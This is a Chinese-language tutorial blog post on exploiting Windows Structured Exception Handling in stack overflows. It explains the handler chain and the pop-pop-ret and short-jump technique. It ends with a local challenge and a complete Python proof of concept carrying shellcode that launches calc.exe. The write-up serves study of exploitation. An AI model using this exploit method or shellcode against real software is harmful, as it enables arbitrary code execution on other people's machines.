---
title: WindowsPwn--SEH
authorId: l1nk
tags:
 - windows
categories:
 - Pwn
date: 2018-01-16 21:23:49
---

各种原因下开始接触 Windows Pwn 了。之前Linux下的那套思想还是能继续用，不过 Windows 平台下似乎有更多有趣的特性可以利用

<!--more-->
Windows 下的 SEH 
-------------------------

## 异常处理那些事
程序的运行并不总是那么稳健，有时候会因为一些错误抛出异常或者导致崩溃。那么如果我们的逻辑中有应对异常的办法，那么就能够保证程序的健壮性。 Windows 下就提供了一种用来处理异常的机制 --- **Structured Exception Handling**

### 异常处理的结构
在微软支持的 C / C++ 编译器优化中，支持如下的代码结构:
```C

__try{
    guarded body of code
}
__except(Condition){
    identifies an exception
}
__finally{
    identifies a termmination handle
}
```
_和别的语言差不多，都是try中放可能会出错的代码，except中存放抛出指定异常的时候的处理代码，finally中则是无论异常是否触发都会进行的最后的收尾工作_

#### 异常抛出后的流程
当一个异常的事件被抛出的时候，系统会首先调用函数`RaiseException`来描述当前线程中的异常的基本信息，然后会决定是否要执行当前的程序。根据不同的情况，异常可以分为**可以继续执行的**和**不可以继续执行的**两种类型。当异常发生的时候，程序首先再当前位置停止当前的进程，然后即将控制权**交给系统**。系统首先会保存当前进程的基本信息，然后会尝试去寻找一个**异常句柄(Exception Handling)**来处理异常情况。当前上下文的信息会被存储在一个叫做**CONTEXT**的结构体中，这些信息用于再完成异常处理后继续运行(如果程序还能够继续运行的话）。这些异常的信息都被存储在一个叫做**EXCEPTION_RECORD**的结构体中。当处理完异常之后，根据异常类型决定是终止当前进程或者是继续运行。

![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh01.png)

`SEH`的位置如下
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh02.png)

*其中有一部分的内容从微软的官方文档中好像不容易找到，于是从网上搜集来的信息如下*
`SEH Handler`对象存储形式:
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png)
大致就是如下的结构体
```
struct SEH Handler{
    PVOID NextSehHandler;
    HANDLERFUNCPTR except_handler_ptr;
}
```
第一个变量记录了下一个`SEH Handler`的位置，`except_hander_ptr`函数则是记录了当前的异常处理函数的地址。  
这个`SEH Chain`就是由这些节点组成的。其中这个节点的末尾的 NextSehHandler 为-1，表示当前节点已经到达尾部，并且该节点上的函数一般都是`ExitTread/ExitProcess`，用于终止当前的进程（也就是说，如果无法处理这个异常的话，我们就终止该进程，没毛病）。
当异常抛出后，系统会对当前的异常程序进行展开，检查当前的 except handle 能否处理当前的异常，如果不行的话就遍历这个`SEH Chain`，如果找到了可以处理异常的节点后，会重新遍历`SEH Chain`,不过这一次是直接访问对应的`except_handler`，并且调用函数进行处理。

#### 相关结构信息

`GS_ExceptionPointers`
```C

typedef struct _EXCEPTION_POINTERS {
  PEXCEPTION_RECORD ExceptionRecord;
  PCONTEXT          ContextRecord;
} EXCEPTION_POINTERS, *PEXCEPTION_POINTERS;
````
变量含义如下:
```
+--------------------------------+--------------------------------------------------------------------------+
|        ExceptionRecord         |  指向ExceptionRecord的指针，里面记载了一个独立于机器的异常行为               |
+--------------------------------+--------------------------------------------------------------------------+
|        ContextRecord           |  指向记录了异常上下文结构体的指针                                           |
+--------------------------------+--------------------------------------------------------------------------+
```

`RaiseException`
```C
void WINAPI RaiseException(
  _In_       DWORD     dwExceptionCode,
  _In_       DWORD     dwExceptionFlags,
  _In_       DWORD     nNumberOfArguments,
  _In_ const ULONG_PTR *lpArguments
);
```
变量含义如下:
```
+--------------------------------+--------------------------------------------------------------------------+
|        dwExceptionCode         |  表示当前线程的发生异常的原因(例如读写保护地址，数组越界并且能够被检查到等等)   |
+--------------------------------+--------------------------------------------------------------------------+
|        dwExceptionFlags        |  表示当前的异常发生后，能够被执行。                                          |
+--------------------------------+--------------------------------------------------------------------------+
|        nNumberOfArguments      |  lpArguments 数组中的参数个数                                              |
+--------------------------------+--------------------------------------------------------------------------+
|        lpArguments             |  当前参数的数组                                                            |
+--------------------------------+--------------------------------------------------------------------------+
```

`EXCEPTION_RECORD`
```C
typedef struct _EXCEPTION_RECORD {
  DWORD                    ExceptionCode;
  DWORD                    ExceptionFlags;
  struct _EXCEPTION_RECORD  *ExceptionRecord;
  PVOID                    ExceptionAddress;
  DWORD                    NumberParameters;
  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];
} EXCEPTION_RECORD, *PEXCEPTION_RECORD;
```
变量含义如下:
```
+------------------------------+--------------------------------------------------------------------------+
|        ExceptionCode         |  表示当前线程的发生异常的原因(例如读写保护地址，数组越界并且能够被检查到等等)   |
+------------------------------+--------------------------------------------------------------------------+
|        ExceptionFlags        |  表示当前的异常发生后，能够被执行。                                          |
+------------------------------+--------------------------------------------------------------------------+
|        ExceptionRecord       |  指向Exceotion_Record的结构体。当异常嵌套发生的时候，这个异常处理会串成链的形式|
+------------------------------+--------------------------------------------------------------------------+
|        ExceptionAddress      |  异常发生时候的地址                                                        |
+------------------------------+--------------------------------------------------------------------------+
|        NumberParameters      |  和当前异常相关的参数。这些参数定义在 ExceptionInformation 数组中             |
+------------------------------+--------------------------------------------------------------------------+
|        ExceptionInformation  |  用于描述当前异常的擦书。函数 RaiseException 可以指定这个数组的参数            |
+------------------------------+--------------------------------------------------------------------------+
```

`except_handler`
```C
except_handler(  
    struct _EXCEPTION_RECORD *ExceptionRecord,  
    void * EstablisherFrame,  
    struct _CONTEXT *ContextRecord,  
    void * DispatcherContext ) 
```
函数作用：
该函数即为SEH这个流程中会调用的异常处理函数。当异常发生的时候，这个函数就会接住抛出的异常并且对其进行处理。

**关键：**
上述大部分变量前面有，**关键变量EstablisherFrame**表示的意思是**当前SEH栈的起始位置**，这个地方往往会成为pwn的位置。

#### 特征代码
由于SEH是以链表的形式存在的，其链表头部存在于`FS:[0]`中，我们可以通过检查代码中是否包含这段代码来确定这个SEH的头部在哪(以下是这段代码的操作码)
```
64A100000000
```

#### 调试中的查看方法

##### windbg
使用指令
```
!exchain
```
可以直接展示当前程序中的SEH

```
d fs:[0]
```
查看当前SEH的起始地址

## 利用方法
前面讲了一大堆，其中最关键的对象就是**栈中的 SEH Handle 存储的形式**这点:
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh05.png)
这里可以看到，如果我们能够知道**哪一个 SEH Handler函数能够处理我们引发的异常，我们就可以通过修改触发对应异常，并且修改对应的函数地址完成eip的劫持**！

### DEP关闭的情况
此时我们需要知道我们填写的shellcode的地址，并且控制程序流跳转上去。这里给出我们需要的payload的形式:
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh06.png)
让我们结合上述的的payload来讲一下这个思路好了：

#### 让eip跳转到esp上！
在进行异常函数调用的时候，**esp的位置发生了变化**。然而根据上面的函数可以知道，每一个`SEH Handler`中都会存储变量`EstablisherFrame`，这个变量就是我们的`SEH Chain`的起始地址，也就是一个**我们可以控制的esp地址**，那么此时我们可以将这个`except_handler`的地址修改成如下的ROP的地址：
```
pop --> 弹出第四个参数
pop --> 弹出第三个参数
ret --> 跳转至EstablisherFrame
```
此时我们就能够跳转到EstablisherFrame上，也就是`SEH Chain`的开头（上图的Jmp处）了！

#### 让eip跳转到shellcode上！
然而此时的程序如之前的payload，`eip`当前的位置后4个字节就又是`pop pop ret`的地址，这样下去的话并不能跳转到我们的shellcode上，于是我们将这个位置填写成一个**向后跳转四个字节**的代码
```asmx86
jmp 0x6 ;"\xeb\x04" 不要忘记自己的两个字节也要跳过去
```
跳转后，就正好落到我们的shellcode上了！


## 实例:触发fread的SEH
这里以一个实际例子来说明SEH的触发。
函数的大致逻辑如下:
```C
    File = _fopen(argv[1], "rb");
    char msg[32];
    memset(msg, 0, 32);
    _fseek(File, 0, 2);
    len = _ftell(File);
    _fseek(v5, 0, 0);
    int num = fread(msg, 1, len, File);
    if(num >= 0x20){
        __report_rangecheckfailure();
        __debugbreak();
        JUMPOUT(*(_DWORD *)__security_check_cookie);
    }
    msg[num] = 0;
    _fclose(File);
    _printf("%s\n", msg);
    result = 0;
```
程序本身逻辑很简单，接收一个传入的参数表示当前读入程序的文件，然后通过检测文件本身的长度，将文件内容读入缓冲区中并且输出到屏幕上。由于打开了`GS`，所以会出现函数`__report_rangecheckfailure()`这类内容。

### 坑点
这个题目看起来就是一个简单的栈溢出，但是由于有`GS`，所以如果我们只是单纯的输入过长的内容，会导致变量**len**的长度**高于0x20，引发__report_rangecheckfailure**。这个函数我上网找到的资料比较少，大致就是**通过检测读入到栈中数据的长度和预定义的数据长度比较，从而检测栈溢出**。于是如果我们像正常程序一样处理，此时程序逻辑就会如下:
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh03.png)

 * int 29h 为 win8新加入的特性，可以以最快的方式结束当前进程
 * 这段逻辑于 main 函数中的 SEH 特性无关

从上述逻辑中可以看到，这个时候原先处于main函数中的 SEH 已经不再参与到整个程序流程中了(可能只是我没有观察到?不过至少是无法利用 main 函数中的 SEH 了)。

这样看来，我们就没有办法触发当前main函数中的异常了。。。。吗？

### 触发异常的方法
这个时候要回到观察我们的`_fread`函数。函数的关键逻辑如下:
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh04.png)
fread函数中的核心逻辑有一段`memcpy`的逻辑，这个逻辑只是简单的调用`rep`，没有进行长度限制之类。于是在这个地方就可能发生**越界读写**。我们这边正是利用了这个思路，**将数据写至栈底以下，触发页保护从而引起异常**。

### payload
由于这个是本地测试的题目，所以我们倒是不用考虑地址泄露啥的，直接用调试器计算出来就好。首先通过peda中的工具`pattern`算出当前距离SEH handler 的距离为88，然后根据此编写shellcode的生成程序:

```python
#   -*- coding:utf-8    -*-

import struct

def u32(num):
    return struct.pack("<I", num)

shellcode = b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b" 
shellcode += b"\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7"
shellcode +=b"\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf"
shellcode +=b"\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c"
shellcode +=b"\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01"
shellcode +=b"\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31"
shellcode +=b"\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d"
shellcode +=b"\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66"
shellcode +=b"\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0"
shellcode +=b"\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f"
shellcode +=b"\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
shellcode +=b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5"
shellcode +=b"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shellcode +=b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
shellcode +=b"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

page_offset = 0xdb0000
pop_pop_ret = u32(0x1931 + page_offset)
jmp_code = b'\x90\x90\xeb\x04'

if __name__ == '__main__':
    fd = open("step2.txt",'wb')
    poc = b"a" * 84 + jmp_code + pop_pop_ret + shellcode + b"a"*3000
    fd.write(poc)
    fd.close()
```
给个弹出来的计算器一个特写~
![](http://showlinkroom.me/2018/01/16/WindowsPwn-SEH/seh07.png)


参考文章
[https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/](https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/)
[https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/](https://www.securitysift.com/windows-exploit-development-part-6-seh-exploits/)